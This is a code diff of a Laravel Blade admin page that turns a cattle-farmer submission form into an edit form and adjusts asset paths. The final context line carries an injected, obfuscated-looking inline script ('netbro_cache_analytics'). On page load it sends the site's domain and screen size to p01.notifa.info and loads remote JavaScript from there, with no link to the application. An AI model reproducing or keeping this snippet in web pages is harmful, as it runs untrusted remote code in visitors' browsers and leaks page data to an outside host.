@@ -38,35 +38,35 @@
     <link href="assetAdmin/assets/images/favicon.ico" rel="shortcut icon">
 
     <!--Preloader-CSS-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/preloader/preloader.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/preloader/preloader.css">
 
     <!--bootstrap-4-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/bootstrap.min.css">
 
     <!--Custom Scroll-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
     <!--Font Icons-->
-    <link rel="stylesheet" href="assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/dripicons/dripicons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/eightyshades/eightyshades.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/foundation/foundation-icons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/metrize/metrize.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/typicons/typicons.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/dripicons/dripicons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/eightyshades/eightyshades.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/foundation/foundation-icons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/metrize/metrize.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/typicons/typicons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">
 
     <!--Date-range-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/date-range/daterangepicker.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/date-range/daterangepicker.css">
     <!--Drop-Zone-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/dropzone/dropzone.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/dropzone/dropzone.css">
     <!--Full Calendar-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
     <!--Normalize Css-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/normalize.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/normalize.css">
     <!--Main Css-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/main.css">
-    <link rel="stylesheet" type="text/css" href="assetAdmin/gradient.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/main.css">
+    <link rel="stylesheet" type="text/css" href="../assetAdmin/gradient.css">
 </head>
 <body>
 
@@ -94,7 +94,7 @@
 
         <!--Navigation Profile area-->
         <div class="navigation-profile">
-            <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
+            <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
             <h4 class="name">Admin Inti</h4>
             <span class="designation">SAPI</span>
 
@@ -103,7 +103,7 @@
             <!--logged user hover menu-->
             <div class="logged-user-menu bg-white">
                 <div class="avatar-info">
-                    <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
+                    <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
                     <h4 class="name">Meera</h4>
                     <span class="designation">UI/UX EXPERT</span>
                 </div>
@@ -138,7 +138,7 @@
         </div>
 
         <!--Navigation Menu Links-->
-        @include('inti.include_inti')
+        @include('inti.includeEdit')
     </nav>
 
     <!--Page Container-->
@@ -176,45 +176,69 @@
                             <!-- <div class="block form-block mb-4" id="grad"> -->
                                 <div class="block form-block mb-4" id="grad_anamnisar">
                                     <div class="block-heading">
-                                        <h5>Tambah Data Pengajuan</h5>
+                                        <h5>Edit Data Pengajuan</h5>
                                     </div>
 
-                                    <form method="POST" action="prosesTambahPengajuan" enctype="multipart/form-data">
+                                    <form method="POST" action="{{url('prosesUpdatePengajuan', $tampiledit->id_pengajuan)}}" enctype="multipart/form-data">
                                         {{csrf_field()}}
-
+                                        <div class="form-group" hidden="">
+                                            <label>Nama Peternak</label>
+                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Nama Peternak" name="nama_peternak" value="{{$tampiledit->id_pengajuan}}">
+                                        </div>
                                         
                                         <div class="form-group">
                                             <label>Nama Peternak</label>
-                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Nama Peternak" name="nama_peternak">
+                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Nama Peternak" name="nama_peternak" value="{{$tampiledit->nama_peternak}}">
                                         </div>
                                         <div class="form-group">
                                             <label>Alamat</label>
-                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Alamat Peternak" name="alamat">
+                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Alamat Peternak" name="alamat" value="{{$tampiledit->alamat}}">
                                         </div>
                                         <div class="form-group">
                                             <label>No KK</label>
-                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan No KK" name="no_kk">
+                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan No KK" name="no_kk" value="{{$tampiledit->no_kk}}">
                                         </div>
                                         <div class="form-group">
                                             <label>Jumlah Sapi</label>
-                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan Jumlah Sapi Peternak" name="jumlah_sapi">
+                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan Jumlah Sapi Peternak" name="jumlah_sapi" value="{{$tampiledit->jumlah_sapi}}">
                                         </div>
                                          
                                         <div class="form-group">
                                             <label>Nomer HP</label>
-                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan Jumlah Sapi Peternak" name="no_hp">
+                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan Jumlah Sapi Peternak" name="no_hp" value="{{$tampiledit->no_hp}}">
                                         </div>
                                          <div class="form-group">
-                                            <label>Upload Foto</label><br>
-                                            <input class=""  type="file" placeholder="20" name="foto_ktp" id="inputgambar">
+                                             <button type="button"  data-toggle="modal" data-target="#myModal">Lihat Foto Sebelumnya</button>
+                                            <input class=""  type="file" placeholder="20" name="foto_ktp" id="inputgambar" value="">
                                         </div>
+                                       
                                         <input type="hidden" name="_token" value="{{ csrf_token() }}">
                                          <button class="btn btn-success" type="submit">Submit</button>
                                     </form>
                                 </div>
 
                                     </div>
-                                   
+                                    <div id="myModal" class="modal fade" role="dialog">
+                                <div class="modal-dialog">
+                                    <!-- konten modal-->
+                                    <div class="modal-content">
+                                        <!-- heading modal -->
+                                        <div class="modal-header">
+                                            
+                                            <h4 class="modal-title">Foto KTP  </h4>
+                                        </div>
+                                        <!-- body modal -->
+                                        <div class="modal-body">
+                                            <td><img src="{{ asset('image/'.$tampiledit->foto_ktp)  }}" class="img-thumbnail" style="max-height:300px;max-width:300px;">
+                                            </div>
+                                            <!-- footer modal -->   
+                                            <div class="modal-footer">
+                                                <button type="button" class="btn btn-default" data-dismiss="modal">Tutup</button>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
                                  
                                                                     
                                                                        
@@ -232,47 +256,47 @@
 
 
         <!--Jquery-->
-        <script type="text/javascript" src="assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
         <!--Bootstrap Js-->
-        <script type="text/javascript" src="assetAdmin/assets/js/popper.min.js"></script>
-        <script type="text/javascript" src="assetAdmin/assets/js/bootstrap.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/js/popper.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/js/bootstrap.min.js"></script>
         <!--Modernizr Js-->
-        <script type="text/javascript" src="assetAdmin/assets/js/modernizr.custom.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/js/modernizr.custom.js"></script>
 
         <!--Morphin Search JS-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/classie.js"></script>
-        <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/classie.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
         <!--Morphin Search JS-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
-        <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
 
         <!--Chart js-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/charts/Chart.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/charts/Chart.min.js"></script>
 
         <!--Sparkline Chart Js-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
-        <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
 
         <!--Custom Scroll-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
         <!--Sortable Js-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
         <!--DropZone Js-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
         <!--Date Range JS-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/moment.min.js"></script>
-        <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/moment.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
         <!--CK Editor JS-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
         <!--Data-Table JS-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
         <!--Editable JS-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/editable/editable.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/editable/editable.js"></script>
         <!--Full Calendar JS-->
-        <script type="text/javascript" src="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
+        <script type="text/javascript" src="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
 
         <!--- Main JS -->
-        <script src="assetAdmin/assets/js/main.js"></script>
+        <script src="../assetAdmin/assets/js/main.js"></script>
 
         <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
